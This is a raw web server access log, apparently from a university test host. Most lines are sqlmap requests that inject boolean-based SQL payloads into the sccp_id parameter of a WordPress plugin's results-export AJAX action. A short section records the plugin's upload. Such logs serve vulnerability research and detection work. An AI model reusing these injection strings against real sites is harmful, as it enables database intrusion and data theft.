1
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9275%29%20WHERE%207484%3D7484%20OR%201459%3D1702--%20wooi&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-1527%29%20WHERE%209725%3D9725%20OR%207981%3D7981--%20QUxh&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-1666%27%20WHERE%208968%3D8968%20OR%206022%3D3900--%20QRsy&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-3831%27%20WHERE%205013%3D5013%20OR%207981%3D7981--%20SqeJ&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-6120%22%20WHERE%208175%3D8175%20OR%204169%3D8507--%20kJmE&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7286%22%20WHERE%207794%3D7794%20OR%207981%3D7981--%20VUUj&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-4117%20WHERE%208055%3D8055%20OR%202797%3D9612--%20ERmv&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-8241%20WHERE%206238%3D6238%20OR%207981%3D7981--%20HpLV&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-1025%27%29%29%20AS%20QUvi%20WHERE%208273%3D8273%20OR%206795%3D8102--%20eXlA&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-2951%27%29%29%20AS%20hPlg%20WHERE%201286%3D1286%20OR%207981%3D7981--%20wCLJ&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-4694%22%29%29%20AS%20QjNe%20WHERE%206703%3D6703%20OR%208612%3D5792--%20Vofz&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-4071%22%29%29%20AS%20EpYy%20WHERE%207725%3D7725%20OR%207981%3D7981--%20Odlg&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7360%29%29%20AS%20GjTu%20WHERE%205591%3D5591%20OR%204720%3D4420--%20KXUk&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-4354%29%29%20AS%20tQGn%20WHERE%207082%3D7082%20OR%207981%3D7981--%20Nxsc&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:13 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-8386%27%29%20AS%20nrey%20WHERE%205989%3D5989%20OR%206664%3D3976--%20bwfk&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-6294%27%29%20AS%20uIRp%20WHERE%201050%3D1050%20OR%207981%3D7981--%20RymS&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-8164%22%29%20AS%20VhMz%20WHERE%204713%3D4713%20OR%209430%3D2671--%20TReW&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9917%22%29%20AS%20sZSX%20WHERE%204295%3D4295%20OR%207981%3D7981--%20GTYg&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-5234%29%20AS%20Uznh%20WHERE%202006%3D2006%20OR%207155%3D1355--%20nxzp&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-5871%29%20AS%20nNKW%20WHERE%207448%3D7448%20OR%207981%3D7981--%20XyZx&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%29%20OR%20NOT%206845%3D6206--%20mVZp&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%20OR%20NOT%204668%3D4232--%20STKO&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%20OR%20NOT%206302%3D7031--%20HWfc&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%20OR%20NOT%206007%3D2308--%20Kbwl&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%29%20OR%20NOT%204285%3D9536%20AND%20%283330%3D3330&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%29%29%20OR%20NOT%204964%3D7301%20AND%20%28%288577%3D8577&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:14 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%29%29%29%20OR%20NOT%208618%3D7557%20AND%20%28%28%287052%3D7052&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%20OR%20NOT%203135%3D9044&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%20OR%20NOT%206777%3D3673%20AND%20%28%27PxdM%27%3D%27PxdM&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%29%20OR%20NOT%204332%3D3015%20AND%20%28%28%27Qwit%27%3D%27Qwit&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%29%29%20OR%20NOT%205209%3D8198%20AND%20%28%28%28%27KqMB%27%3D%27KqMB&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%20OR%20NOT%209638%3D9674%20AND%20%27ODtx%27%3D%27ODtx&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%20OR%20NOT%206091%3D7346%20AND%20%28%27DmVr%27%20LIKE%20%27DmVr&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%29%20OR%20NOT%203203%3D3977%20AND%20%28%28%27LgbI%27%20LIKE%20%27LgbI&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%29%29%20OR%20NOT%204479%3D8905%20AND%20%28%28%28%27eovX%27%20LIKE%20%27eovX&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%25%27%20OR%20NOT%209895%3D2409%20AND%20%27fHfz%25%27%3D%27fHfz&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%20OR%20NOT%202784%3D1489%20AND%20%27xrsf%27%20LIKE%20%27xrsf&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:15 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%20OR%20NOT%205374%3D5589%20AND%20%28%22Tbiy%22%3D%22Tbiy&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%29%20OR%20NOT%206520%3D2169%20AND%20%28%28%22DNzv%22%3D%22DNzv&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%29%29%20OR%20NOT%206079%3D2030%20AND%20%28%28%28%22CCme%22%3D%22CCme&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%20OR%20NOT%202321%3D4374%20AND%20%22FtSt%22%3D%22FtSt&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%20OR%20NOT%208991%3D5334%20AND%20%28%22ZCFR%22%20LIKE%20%22ZCFR&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%29%20OR%20NOT%202971%3D3566%20AND%20%28%28%22xhiK%22%20LIKE%20%22xhiK&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%29%29%20OR%20NOT%207123%3D1778%20AND%20%28%28%28%22RQoD%22%20LIKE%20%22RQoD&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%20OR%20NOT%202513%3D5924%20AND%20%22CoRn%22%20LIKE%20%22CoRn&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%20OR%20NOT%209403%3D6073--%20zyWw&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%20OR%20NOT%207496%3D4846%23%20CCPU&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%20OR%20NOT%209456%3D2996%20OR%20%27uwxp%27%3D%27qVsF&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%20WHERE%203588%3D3588%20OR%20NOT%209144%3D7164--%20ubeX&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%20WHERE%201876%3D1876%20OR%20NOT%203575%3D5789--%20iaKM&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:16 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%29%20WHERE%203556%3D3556%20OR%20NOT%207802%3D1611--%20whIO&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:17 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%20WHERE%207770%3D7770%20OR%20NOT%209275%3D6812--%20FZnA&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:17 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%20WHERE%207727%3D7727%20OR%20NOT%202316%3D5716--%20DAqz&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:17 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%20WHERE%208073%3D8073%20OR%20NOT%203245%3D6996--%20HEhg&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:17 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%7C%7C%28SELECT%20avkh%20WHERE%209124%3D9124%20OR%20NOT%207970%3D9244%29%7C%7C%27&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
2
192.168.62.175 - - [20/Apr/2022:21:20:25 +0300] "POST /wp-admin/update.php?action=upload-plugin HTTP/1.1" 200 55280 "http://teste.cs.tuiasi.ro:18667/wp-admin/plugin-install.php?s=secure-copy-content%20protection&tab=search&type=term" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
192.168.62.175 - - [20/Apr/2022:21:20:25 +0300] "GET /wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons&ver=5.9.3 HTTP/1.1" 200 383617 "http://teste.cs.tuiasi.ro:18667/wp-admin/update.php?action=upload-plugin" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
81.180.223.170 - - [20/Apr/2022:21:21:07 +0300] "POST /wp-cron.php?doing_wp_cron=1650478867.6316220760345458984375 HTTP/1.1" 200 - "http://teste.cs.tuiasi.ro:18667/wp-cron.php?doing_wp_cron=1650478867.6316220760345458984375" "WordPress/5.9.3; http://teste.cs.tuiasi.ro:18667"
192.168.62.175 - - [20/Apr/2022:21:21:07 +0300] "POST /wp-admin/update.php?action=upload-plugin&package=91&_wpnonce=8175047076 HTTP/1.1" 200 55499 "http://teste.cs.tuiasi.ro:18667/wp-admin/update.php?action=upload-plugin" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
192.168.62.175 - - [20/Apr/2022:21:21:11 +0300] "GET /wp-admin/plugins.php HTTP/1.1" 200 107263 "http://teste.cs.tuiasi.ro:18667/wp-admin/update.php?action=upload-plugin&package=91&_wpnonce=8175047076" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
192.168.62.175 - - [20/Apr/2022:21:21:17 +0300] "GET /wp-admin/options-general.php HTTP/1.1" 200 89454 "http://teste.cs.tuiasi.ro:18667/wp-admin/plugins.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
